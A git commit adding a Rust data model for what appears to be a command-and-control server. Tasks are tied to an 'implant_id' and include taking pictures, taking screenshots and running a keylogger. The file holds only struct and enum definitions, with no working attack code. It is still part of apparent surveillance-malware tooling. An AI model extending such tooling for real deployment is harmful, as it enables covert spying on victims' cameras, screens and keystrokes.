c21cd015cdf271be82039628a9545fe4ee79d9cb
drseu55 <alpics1337@gmail.com>
2022-05-31 16:22:33 +0300

    feat: Add task model and tasks enum implementations

---
+++ src/models/task.rs
@@ -0,0 +1,35 @@
+use chrono;
+use serde::Deserialize;
+use std::str::FromStr;
+use uuid;
+
+#[derive(Debug, Deserialize)]
+pub struct Task {
+    pub task_id: uuid::Uuid,
+    pub task: String,
+    pub created_at: chrono::NaiveDateTime,
+    pub status: String,
+    pub implant_id: uuid::Uuid,
+}
+
+#[derive(Debug, PartialEq)]
+pub enum Tasks {
+    GetInfo,
+    TakePicture,
+    TakeScreenshot,
+    Keylogger,
+}
+
+impl FromStr for Tasks {
+    type Err = ();
+
+    fn from_str(input: &str) -> Result<Self, Self::Err> {
+        match input {
+            "get_info" => Ok(Tasks::GetInfo),
+            "take_picture" => Ok(Tasks::TakePicture),
+            "take_screenshot" => Ok(Tasks::TakeScreenshot),
+            "keylogger" => Ok(Tasks::Keylogger),
+            _ => Err(()),
+        }
+    }
+}
